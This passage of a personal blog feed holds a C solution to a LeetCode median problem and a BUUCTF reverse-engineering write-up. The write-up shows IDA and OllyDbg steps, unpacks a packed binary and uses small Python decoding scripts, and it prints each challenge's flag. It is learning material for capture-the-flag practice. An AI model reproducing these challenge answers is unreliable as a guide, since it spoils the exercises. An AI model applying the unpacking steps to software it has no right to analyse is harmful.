    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/median-of-two-sorted-arrays/</p><blockquote><p>题目描述：</p><p>给定两个大小分别为 <code>m</code> 和 <code>n</code>的正序（从小到大）数组 <code>nums1</code> 和<code>nums2</code>。请你找出并返回这两个正序数组的<strong>中位数</strong> 。</p><p>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p><p>示例 ：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br></pre></td></tr></tbody></table></figure></blockquote><p>第五行，我一开始的写法是</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size, j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure><p>这里我犯了一个低级错误，怎么提交都不对<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，正确写法为：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure><p>完整代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size)</span>{</span><br><span class="line">    <span class="type">int</span> nums3[nums1Size + nums2Size]; <span class="comment">//定义新数组</span></span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">double</span> result;</span><br><span class="line">    <span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;){ <span class="comment">//讲较小的值放入nums3中</span></span><br><span class="line">        <span class="keyword">if</span> (nums1[i] &lt;= nums2[j]){</span><br><span class="line">            nums3[k] = nums1[i];</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            nums3[k] = nums2[j];</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(j,k; j&lt; nums2Size; j++,k++){ <span class="comment">//nums1Size &lt; nums2Size 时，会执行该代码</span></span><br><span class="line">        nums3[k] = nums2[j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i,k; i&lt; nums1Size; i++,k++){ <span class="comment">//nums1Size &gt; nums2Size 时，会执行该代码</span></span><br><span class="line">        nums3[k] = nums1[i];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line">    m = nums1Size + nums2Size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(m%<span class="number">2</span> == <span class="number">0</span>){ <span class="comment">//元素总数为偶数</span></span><br><span class="line">        result = (nums3[m/<span class="number">2</span>] + nums3[m/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> { <span class="comment">//元素总数为奇数</span></span><br><span class="line">        result = nums3[m/<span class="number">2</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Reverse做题记录</title>
    <link href="/2023/06/27/Reverse%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/06/27/Reverse%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="buuctf">BUUCTF</h2><h3 id="easyre">1.easyre</h3><p>下载压缩包，用Exeinfope查看文件架构信息： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/b454fe47178e4ece86e9b4a8e69fb35f.png" alt="在这里插入图片描述">可知文件是64位，将其拖进IDA64中，直接得到flag <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6cd55322012c45b5a4158bc1fd28cc6f.png" alt="在这里插入图片描述"></p><h3 id="reverse1">2.reverse1</h3><p>先判断文件为64位，用IDA64打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1d017b7ed51047ae869a046f91c4ddb6.png" alt="在这里插入图片描述">切换为文本界面也没有什么特殊字符，然后通过Shift+F12打开String窗口 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/dde454aebd1b46e79d022ad822f261cc.png" alt="在这里插入图片描述"> 找到关键字符，双击后进入反汇编的文本界面<img src="https://img-blog.csdnimg.cn/d3cc6d422d964c509323e8207faaed6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASF94dA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"> 按Ctrl+X找到该地址的函数 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/c333353c6fb4480e8c2dbd4b823f8966.png" alt="在这里插入图片描述"> 双击Address一栏下方的地址 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1d3482dc52df48cab2dd09ce412e8036.png" alt="在这里插入图片描述"> 按F5进入伪代码窗口 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/dd3012e2c7494ea48b8dd0cc52510ba5.png" alt="在这里插入图片描述">阅读伪代码可知Str1和Str2进行了比较，当两者不相同是输出“this is the rightflag!”。将“111”和“48”以char类型显示 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/18610c3416d643b0bb474f51956cb6b7.png" alt="在这里插入图片描述">可知"hello_world"中的'o'被替换为了'0'，所以flag为flag{hell0_w0rld}。</p><span id="more"></span><h3 id="reverse2">3.reverse2</h3><p>打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/259901194e564efa976e1ec25b7abb3e.png" alt="在这里插入图片描述"> 按F5进入伪代码窗口 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/26fef228d9574c70b564dd0ef4d79254.png" alt="在这里插入图片描述"> 将一些整型转换为char类型 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/4982256a01b4420db577196099486518.png" alt="在这里插入图片描述">现在只需知道flag的内容，然后将’i‘和’r'替换为‘1’。 双击‘&amp;flag’ <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/b9041e7325834372b9a243920b26134c.png" alt="在这里插入图片描述">得到字符串“hacking_for_fun”，所以flag为flag{hack1ng_fo1_fun}。</p><h3 id="内涵的软件">4.内涵的软件</h3><p>用IDA打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/7b5f68ce277c4cbbb667826c30714161.png" alt="在这里插入图片描述"> 双击“_main_0”函数 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/227ade9dab51417aadaa8d7f79506ec7.png" alt="在这里插入图片描述">我一开始看字符串为32位，以为是md5加密，但是行不通，于是直接将大括号里的字符串作为flag，结果答案正确。</p><h3 id="新年快乐">5.新年快乐</h3><p>用IDA打开文件，发现只显示了两个函数且控制流图比较复杂，猜测加了壳。<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/fb420d7a3c04452ea744eb117d7ead71.png" alt="在这里插入图片描述"> 然后用OD打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/14285ebf5326479f8ba8cc84c3eeb264.png" alt="在这里插入图片描述"> 按F9运行到下一个断点 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/c0994c44c301438f9ac633b8d8926c79.png" alt="在这里插入图片描述">发现popad，按F9再次运行到下一个断点，再按F8单步步过 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1c245929786649ce868145c21e7f8470.png" alt="在这里插入图片描述"> 直接转到了OEP，鼠标右击出现： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/e6a05b9028eb4515a6cb89bbf830372a.png" alt="在这里插入图片描述">修改相关数据进行脱壳并保存脱壳后的文件“新年快乐_dump.exe” <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/196101e59a79474bac2874abd509589e.png" alt="在这里插入图片描述"> 用IDA打开该文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/9be8e105191a476a8917b911ed2878f7.png" alt="在这里插入图片描述"> 出现多个函数且发现main函数，直接F5反编译<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/e56086b1be6d40d298d8bf594d4f1aa0.png" alt="在这里插入图片描述"> 可知flag为{HappyNewYear!}。</p><h3 id="xor">6.xor</h3><p>判断出文件为64位后用IDA64打开文件，F5查看伪代码： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/fb5453f2fa074ccfb08d71f38b635dee.png" alt="在这里插入图片描述">分析伪代码，发现global变量是我们已知的，双击进入 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/9220d87cdb914402943c6374c4a9d721.png" alt="在这里插入图片描述"> 然后编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1 = [<span class="string">'f'</span>, <span class="number">0x0A</span>, <span class="string">'k'</span>, <span class="number">0x0C</span>, <span class="string">'w'</span>, <span class="string">'&amp;'</span>, <span class="string">'O'</span>, <span class="string">'.'</span>, <span class="string">'@'</span>, <span class="number">0x11</span>, <span class="string">'x'</span>, <span class="number">0x0D</span>, <span class="string">'Z'</span>, <span class="string">';'</span>, <span class="string">'U'</span>, <span class="number">0x11</span>, <span class="string">'p'</span>, <span class="number">0x19</span>, <span class="string">'F'</span>, <span class="number">0x1F</span>, <span class="string">'v'</span>,</span><br><span class="line">        <span class="string">'"'</span>, <span class="string">'M'</span>, <span class="string">'#'</span>, <span class="string">'D'</span>, <span class="number">0x0E</span>, <span class="string">'g'</span>, <span class="number">6</span>, <span class="string">'h'</span>, <span class="number">0x0F</span>, <span class="string">'G'</span>, <span class="string">'2'</span>, <span class="string">'O'</span>]</span><br><span class="line"></span><br><span class="line">x = <span class="string">'f'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isinstance</span>(str1[i], <span class="built_in">str</span>)):<span class="comment">#判断两个类型是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isinstance</span>(str1[i - <span class="number">1</span>], <span class="built_in">str</span>)):</span><br><span class="line">            x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ <span class="built_in">ord</span>(str1[i - <span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ str1[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x += <span class="built_in">chr</span>(str1[i] ^ <span class="built_in">ord</span>(str1[i - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></tbody></table></figure><p>运行得出flag </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{QianQiuWanDai_YiTongJiangHu}</span><br></pre></td></tr></tbody></table></figure> ### 7.helloworld下载文件后发现文件后缀是apk，之前没有遇到过，经过搜索后得知是安卓文件，需要ApkIDE工具进行分析。用其打开文件后，不断打开文件夹寻找特殊文件，发现一个包含Main字段的文件，打开后发现flag。<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/cb0aeb63625e4726a73f7ca12dba4299.png" alt="在这里插入图片描述"><p></p><h3 id="reverse3">8.reverse3</h3><p>用IDA打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/54751906dc2b40d0a81381d828766102.png" alt="在这里插入图片描述"> F5查看伪代码，发现main_0函数，双击进入 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/e3f6b809f0fa4891a6c542d56f129c6a.png" alt="在这里插入图片描述">分析代码可知首先将v1的值赋给Dest，然后对Dest进行处理，其中v1的值是字符串经过函数sub_4110BE处理的结果。Dest又与Str2相同，双击查看Str2得到字符串“e3nifIH9b_C@n<span class="citation" data-cites="dH">@dH</span>”，因此逆向处理一下Str2即可得到v1，双击进入该函数<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/636dc98e381148d2b772dd5c45466143.png" alt="在这里插入图片描述"> 发现出现大量重复字符串，再次双击，得到 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/f5b56ab29b9e45bd81f9b7b46bb60c01.png" alt="在这里插入图片描述"> 感觉大概率是Base64编码了，接下来编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">Dest = <span class="string">"e3nifIH9b_C@n@dH"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(Dest[i])-i)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></tbody></table></figure><p>运行得到flag <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/ce8c4690feee421c928bd7ec9c04f185.png" alt="在这里插入图片描述"></p><h3 id="不一样的flag">9.不一样的flag</h3><h3 id="simplerev">10.SimpleRev</h3><p>首先判断出文件是64位的，拖入IDA64中 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/0f92a09adad44ef59525c6ff7272deac.png" alt="在这里插入图片描述"> F5查看伪代码，发现Decry()函数，双击进入 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/44c5cb32259f422bb00f1b9b276b4c30.png" alt="在这里插入图片描述"> 阅读代码，将特殊的数字转换为字符串 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1f2ba2d9f8614b54b944f281bfc34938.png" alt="在这里插入图片描述">此时注意大小端序的区别，IDA上显示为大端序，而原本的数据在计算机内部存储为小端序，所以要将将两个字符串倒序，得到text= ‘killshadow’，key ='ADSFKNDCLS'。接下来就是分析代码，编写出脚本。由于我的python水平较低，写出的代码不够简洁，凑合着看。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'ADSFKNDCLS'</span></span><br><span class="line">key = <span class="built_in">list</span>(key)</span><br><span class="line">v9 = <span class="string">'wodah'</span><span class="comment">#大端序</span></span><br><span class="line">text = <span class="string">'killshadow'</span></span><br><span class="line">text = <span class="built_in">list</span>(text)</span><br><span class="line">str2=<span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v5 = <span class="built_in">len</span>(key)</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,v5):</span><br><span class="line">    <span class="keyword">if</span> key[v3%v5]&gt;=<span class="string">'A'</span> <span class="keyword">and</span> key[v3%v5]&lt;=<span class="string">'Z'</span>:</span><br><span class="line">        key[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[v3%v5])+<span class="number">32</span>)</span><br><span class="line">    v3+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(text)):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> y&gt;=<span class="number">65</span> <span class="keyword">and</span> y&lt;=<span class="number">90</span>: </span><br><span class="line">            <span class="keyword">if</span> (y-<span class="number">39</span>-<span class="built_in">ord</span>(key[x%v5])+<span class="number">97</span>)%<span class="number">26</span>+<span class="number">97</span> == <span class="built_in">ord</span>(text[x%v5]):</span><br><span class="line">                flag+=<span class="built_in">chr</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行结果为：KLDQCUDFZO ### 11.[GXYCTF2019]luck_guy参考：https://chowdera.com/2022/02/202202062232392340.html用IDA打开文件，直接F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/5787fa28addf43e08a8005b0b7175ccc.png" alt="在这里插入图片描述"> 双击进入“patch_me” <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/bb367cb767a84aea9703677dc90d9f5d.png" alt="在这里插入图片描述"> 再双击进入get_flag()中</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">rand</span>() % <span class="number">200</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"OK, it's flag:"</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Solar not like you"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Solar want a girlfriend"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">1</span>;</span><br><span class="line">          *(&amp;f2 + j) = v1;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"emmm,you can't find flag 23333"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>阅读代码可知得到flag的顺序应该为<code>case 4-&gt;case 5-&gt;case 1</code>，将光标移到s值处，按R键得到<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/d2f497c1674d4143a91cd883f011a79a.png" alt="在这里插入图片描述">共有8个字符，将s转换为16进制，得到<code>0x7F666F6067756369</code>，由于内存中数据存储顺序为小端序，所以，十六进制真正的顺序是<code>0x69637567606F667F</code>。写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">'GXY{do_not_'</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行可得<code>GXY{do_not_hate_me}</code>，最后提交的时候将GXY改为flag。### 12.Java逆向解密下载附件可知附件为编译后的java文件，通过JD-GUI打开附件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/58ffb0d56aa648ff990e654cafeeee4b.png" alt="在这里插入图片描述"> 分析源代码，通过python写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">l=<span class="built_in">len</span>(key)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((key[i]^<span class="number">0x20</span>)-<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行的flag为: <code>This_is_the_flag_!</code>。 ###13.[BJDCTF2020]JustRE 这题算是我运气好，连蒙带猜得到了flag。用IDA打开文件，光标移至WinMain处，查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/0572832498014932af27d2addef3279c.png" alt="在这里插入图片描述"> 紫色高亮函数为库函数，双击进入sub_4010C0函数<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6294104fede849bda72d7736f2643b0d.png" alt="在这里插入图片描述">上图中均为初始化相关参数，双击查看sub_4011C0函数 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/334b68f870c74d61ac66e683af22f398.png" alt="在这里插入图片描述"> 根据代码可知DialogFunc应该很重要，双击查看<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/ca768441d6e54da0ad42456cf51fd8d8.png" alt="在这里插入图片描述">可知当dword_4099F0等于19999时，会将aBjdDD2069a4579的值赋予String，双击aBjdDD2069a4579<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/df604c58ed1f494fb88c466f445180b7.png" alt="在这里插入图片描述">发现疑似flag的字符串，猜测将其中两个“%d”替换为相应的整数可得到完整的flag。根据sprintf函数的性质 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/3c45182480694e03898888a986234b13.png" alt="在这里插入图片描述">再结合<code>sprintf(&amp;String, aBjdDD2069a4579, 19999, 0)</code>可知两个整数分别为19999和0，最终可得flag为：<code>flag{1999902069a45792d233ac}</code>。</p><h3 id="刮开有奖">14.刮开有奖</h3><p>首先用exeinfope打开文件，发现是32位，且无壳</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220905095138713.png" alt="image-20220905095138713"><figcaption aria-hidden="true">image-20220905095138713</figcaption></figure><p>用32位的IDA打开文件，将光标移至WinMain函数处，按F5查看伪代码，发现只有一个函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 